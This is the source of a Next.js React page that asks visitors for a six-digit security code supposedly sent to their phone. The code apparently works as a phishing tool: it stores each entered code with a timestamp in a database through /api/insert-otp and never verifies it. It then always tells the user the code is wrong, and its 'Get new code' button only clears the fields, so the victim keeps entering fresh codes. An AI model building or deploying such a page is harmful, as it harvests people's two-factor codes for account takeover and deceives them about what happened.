"use client";
import Head from "next/head";
import Image from "next/image";
import React, { useRef, useState } from "react";

function OTP() {
  const [otp, setOtp] = useState(Array(6).fill(""));
  const inputsRef = useRef([]);
  const [isShown, setIsShown] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e, index) => {
    const value = e.target.value;
    if (!/^\d*$/.test(value)) return; // Allow only digits

    const newOtp = [...otp];
    newOtp[index] = value.slice(-1); // Only take the last digit
    setOtp(newOtp);
    setIsShown(false);

    if (value && index < otp.length - 1) {
      inputsRef.current[index + 1].focus(); // Move focus to the next input
      setIsShown(false);
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1].focus();
      setIsShown(false);
    }
  };

  const handlePaste = (e) => {
    const data = e.clipboardData.getData("text").split("");
    if (data.length === otp.length) {
      const newOtp = data.slice(0, otp.length);
      setOtp(newOtp);
      inputsRef.current[otp.length - 1].focus(); // Focus on the last input
      setIsShown(false);
    }
  };

  const handleSubmit = () => {
    const otpCode = otp.join("");
    console.log("OTP Submitted:", otpCode);
    submitOTP(otpCode);
  };

  async function submitOTP(otp) {
    setIsLoading(true);
    try {
      const res = await fetch("/api/insert-otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          databaseId: "6751f99600393a1261d8",
          collectionId: "6751fca500052d8703ef",
          data: { otp: otp, createdAt: new Date().toISOString() },
        }),
      });
      const results = await res.json();
      console.log("Document Inserted Successfully", results.document);
    } catch (error) {
      console.log(error.message);
    } finally {
      setIsLoading(false);
      setIsShown(true);
    }
  }
  function handleGetNewCode() {
    setOtp(Array(6).fill(""));
    setIsShown(false);
  }
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white md:px-4 px-2">
      <div className="bg-white rounded-xl shadow-md text-center py-8  sm:px-4 md:py-12  md:px-8 flex flex-col gap-4 w-full max-w-md">
        <Image
          className="mx-auto w-12 h-12 my-4"
          src="/logo-1.svg"
          alt="Logo"
          width={48}
          height={48}
        />
        <div className="flex flex-col gap-2">
          <h3 className="text-xl md:text-2xl font-bold tracking-wide text-gray-800">
            Enter your code
          </h3>
          <p className="text-gray-500 md:text-lg text-base">
            We sent a security code to your phone number
          </p>
        </div>
        <button
          onClick={handleGetNewCode}
          className="text-lg font-bold text-blue-800 hover:text-blue-700 transition duration-300"
        >
          Get new code
        </button>
        <div
          className="otp-field flex justify-center items-center  md:gap-2 mt-4"
          onPaste={handlePaste}
        >
          {otp.map((digit, index) => (
            <input
              key={index}
              ref={(el) => (inputsRef.current[index] = el)}
              type="text"
              maxLength="1"
              value={digit}
              onChange={(e) => handleInputChange(e, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              className="otp-input w-9 h-9 sm:w-12 sm:h-12 md:w-14 md:h-14 text-center md:text-xl font-medium border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          ))}
        </div>
        {isShown && (
          <p className="text-red-600 text-sm">
            There is an issue with the code you entered. Please try again.
          </p>
        )}
        <button
          onClick={handleSubmit}
          className="w-full py-3 mt-4 bg-blue-800 text-white rounded-lg text-lg font-bold hover:bg-blue-700 transition duration-300 focus:ring-4 focus:ring-blue-500/30"
        >
          {isLoading ? "Submitting..." : "Submit"}
        </button>
      </div>
      <footer className="mt-8 text-center text-sm text-gray-600">
        <p>&copy; {new Date().getFullYear()} All Rights Reserved</p>
      </footer>
    </div>
  );
}

export default OTP;
